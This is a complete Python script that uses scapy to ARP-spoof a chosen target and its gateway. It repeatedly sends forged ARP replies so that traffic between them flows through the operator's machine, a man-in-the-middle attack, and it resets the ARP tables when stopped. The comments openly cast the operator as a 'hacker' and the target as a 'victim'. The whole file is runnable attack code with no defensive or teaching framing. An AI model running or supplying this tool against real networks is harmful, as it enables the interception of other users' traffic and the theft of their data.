# ARP spoof a single Ip
# !/usr/bin/env python

import optparse
import scapy.all as scapy
import time
import sys


def getInput():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--targetIp", dest="tIp", help="Specify target Ip")
    parser.add_option("-g", "--GatewayIp", dest="gIp", help="Specify gateway Ip")
    options = parser.parse_args()[0]
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast_ether / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_response, verbose=False, count=10)


def spoof(target_ip, spoof_ip):
    # ARP Response from hacker machine to victim's machine to make an entry in ARP Table for gateway router for both
    # devices in the same subnet
    # packet = scapy.ARP(response op code, destination Ip, destination MAC, Source Ip)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def main():
    options = getInput()
    if not options.tIp:
        print("[-] Target ip not specified")
    elif not options.gIp:
        print("[-] Gateway ip not specified")
    else:
        target_ip = options.tIp
        gateway_ip = options.gIp
        try:
            sent_packet = 0
            while True:
                sent_packet += 2
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                print("\r[+] sent " + str(sent_packet)),  # overwrite the last output or reset the printing pointer
                # back to start
                sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[-] Resetting ARP Table...... Please Wait.\n")
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
            print("[+] ARP Table has been reset ")


main()
